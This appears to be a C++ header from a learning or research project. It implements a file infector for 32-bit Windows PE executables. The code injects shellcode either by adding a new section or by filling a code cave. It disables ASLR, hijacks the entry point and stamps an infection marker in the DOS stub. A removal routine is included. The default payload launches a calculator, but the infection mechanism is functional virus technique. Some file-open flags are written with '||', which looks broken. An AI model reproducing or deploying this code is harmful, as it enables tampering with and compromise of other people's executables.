#pragma once
#include <string>
#include <Windows.h>
#include <fstream>
#include <iostream>
#include "pe.hpp"

#define SMALL_SHELLCODE_LEN 1024

// 感染标记长度
#define INFECT_SIGN_LENGTH 12
// 感染标记
const CHAR INFECT_SIGN[INFECT_SIGN_LENGTH] = { "hi, qiufeng" };
// 感染类型
enum InfectType {
	ADD_SECTION, CODE_CAVE
};

std::string GetCalcuatorShellcode32(DWORD entry_point);


// 感染结构体，该结构体会被写入 Dos Stub
typedef struct _InfectPadding {
	CHAR sign[INFECT_SIGN_LENGTH] = { "hi, qiufeng" };
	// 原始入口点 RVA
	DWORD old_entry_point;
	// 被感染的节
	BYTE name[8];
	InfectType type;
} InfectPadding;

class InfectHelper {
private:
	std::string path;
	PEHelper helper;

	// 搜索超过一定长度的最近代码空洞
	bool FindCodeCave(const DWORD len, CodeCave &cave) {
		bool flag = false;
		std::vector<CodeCave> cave_vector(std::move(helper.SearchCodeCave()));
		// 找一个适合注入的代码空洞
		for (auto it = cave_vector.begin(); it != cave_vector.end(); it++) {
			if (it->size >= len) {
				cave = *it;
				flag = true;
				break;
			}
		}
		if (!flag) {
			std::cerr << "shellcode太长，请选择新增节注入方法!" << std::endl;
		}
		return flag;
	}

public:
	InfectHelper(std::string file_path) : path(file_path) {
		helper.LoadPE(path);
	};

	InfectPadding LoadInfectPadding() {
		std::ifstream file(path, std::ios::binary);
		file.seekg(helper.GetDosStubFOA(), std::ios::beg);
		
		CHAR* buffer = new CHAR[sizeof(InfectPadding) + 1];
		// 先读入缓冲区
		file.read(buffer, sizeof(InfectPadding));

		InfectPadding pad;
		std::memcpy(&pad, buffer, sizeof(InfectPadding));
		delete[] buffer;
		file.close();

		return pad;
	}

	void WriteInfectPadding(InfectPadding pad) {
		std::ofstream file(path, std::ios::binary || std::ios::ate);
		file.seekp(helper.GetDosStubFOA(), std::ios::beg);

		CHAR* buffer = new CHAR[sizeof(InfectPadding) + 1];
		std::memcpy(buffer, &pad, sizeof(InfectPadding));
		file.write(buffer, sizeof(InfectPadding));

		delete[] buffer;
		file.close();
	}

	bool IsInfected() {
		InfectPadding pad = LoadInfectPadding();
		if (std::memcmp(pad.sign, &INFECT_SIGN[0], INFECT_SIGN_LENGTH)) return false;
		return true;
	}

	bool InfectByAddSection(const std::string name = ".qiufeng",
							std::string shellcode = "") {
		// 如果已经感染，则不再感染
		if (IsInfected()) {
			std::cerr << "程序已经被感染!" << std::endl;
			return false;
		}
		// 关闭 ASLR
		helper.CloseASLR();

		InfectPadding pad;
		pad.type = ADD_SECTION;
		std::memcpy(pad.name, name.c_str(), IMAGE_SIZEOF_SHORT_NAME);
		// 保存旧的入口点
		pad.old_entry_point = helper.GetEntryPointRVA();

		switch (helper.GetPEType()) {
		case PE32: {
			// 修改入口点的 RVA 指向新节
			// 这里前 4 个字节存储的是 OEP
			helper.SetEntryPoint(helper.GetNewSectionRVA() + 4);
			if (!shellcode.size()) {
				shellcode = GetCalcuatorShellcode32(pad.old_entry_point + helper.GetImageBase());
			}
			// 添加新节
			helper.AddNewSection(shellcode, pad.name);
			break;
		}
		case PE64: {
			std::cerr << "未实现 PE64 的感染" << std::endl;
			std::exit(EXIT_FAILURE);
		}
		}
		// 写入 padding
		WriteInfectPadding(pad);
		// 重新加载
		helper.LoadPE(path);
		
		return true;
	}

	// 代码空洞注入
	// 相比于新增节注入，代码空洞注入需要修改的地方比较少
	// 1. 注入空洞
	// 2. 修改入口点
	// TODO
	// 先考虑简单一点的情况，即选第一个可以注入的节注入
	bool InfectByCodeCave(std::string shellcode = "", 
						  //std::string name = "",
						  // 注入点距离代码空洞头的偏移
						  const DWORD offset = 0x20) {
		// 如果已经感染，则不再感染
		if (IsInfected()) {
			std::cerr << "程序已经被感染!" << std::endl;
			return false;
		}
		
		if (!shellcode.size()) {
			switch (helper.GetPEType()) {
			case PE32: {
				shellcode = GetCalcuatorShellcode32(helper.GetEntryPointRVA() + helper.GetImageBase());
				break;
			}
			case PE64: {
				std::cerr << "不支持64位的 shellcode" << std::endl;
				std::exit(EXIT_FAILURE);
			}
			}
		}
		// 关闭 ASLR
		helper.CloseASLR();
		// 搜索代码空洞
		CodeCave cave;
		if (!FindCodeCave(shellcode.size() + offset, cave)) return false;

		InfectPadding pad;
		pad.type = CODE_CAVE;
		std::memcpy(pad.name, cave.name, IMAGE_SIZEOF_SHORT_NAME);
		// 保存旧的入口点
		pad.old_entry_point = helper.GetEntryPointRVA();

		std::ofstream file(path, std::ios::beg || std::ios::ate);

		switch (helper.GetPEType()) {
		case PE32: {
			// 新的 RVA = 空洞起始RVA + offset + 4
			helper.SetEntryPoint(cave.start_rva + offset + 4);
			file.seekp(cave.start_foa + offset, std::ios::beg);
			// 注入
			file.write(shellcode.c_str(), shellcode.size());
			break;
		}
		case PE64: {
			std::cerr << "未实现 PE64 的感染" << std::endl;
			std::exit(EXIT_FAILURE);
		}
		}
		// 写入 padding
		WriteInfectPadding(pad);
		// 重新加载
		helper.LoadPE(path);

		file.close();
		return true;
	}

	bool RemoveVirus() {
		if (!IsInfected()) {
			std::cerr << "文件没有被感染" << std::endl;
			return false;
		}
		InfectPadding pad = LoadInfectPadding();
		std::ofstream file(path, std::ios::binary || std::ios::ate);

		switch (pad.type) {
		case ADD_SECTION: {
			// 回复原始入口点
			helper.SetEntryPoint(pad.old_entry_point);
			// TODO
			// 如果该节不是最后一个，那么删除该节不是很容易
			// 清除感染标记
			std::memcpy(pad.sign, "by", 2);
			break;
		}
		case CODE_CAVE: {
			DWORD entry_point_foa(helper.RVAToFOA(helper.GetEntryPointRVA()));
			// 回复原始入口点
			helper.SetEntryPoint(pad.old_entry_point);
			switch (helper.GetPEType()) {
			case PE32: {
				// 需要减去保存 OEP 的 4 个字节
				entry_point_foa -= 4;
				// 需要填 0 的大小根据文件对齐来计算
				int zero_buffer_len = helper.GetFileAlignment() - (entry_point_foa % helper.GetFileAlignment());
				zero_buffer_len %= helper.GetFileAlignment();
				std::string zero_buffer(zero_buffer_len, 0x00);
				// 注入代码清除
				file.seekp(entry_point_foa, std::ios::beg);
				file.write(zero_buffer.c_str(), zero_buffer_len);
				// 清除感染标记
				std::memcpy(pad.sign, "by", 2);

				break;
			}
			case PE64: {
				std::cerr << "64位空洞注入清除未实现" << std::endl;
				break;
			}
			}
			std::memcpy(pad.sign, "by", 2);
			break;
		}
		}
		// 写入 padding
		WriteInfectPadding(pad);
		// 重新加载
		helper.LoadPE(path);

		return true;
	}

};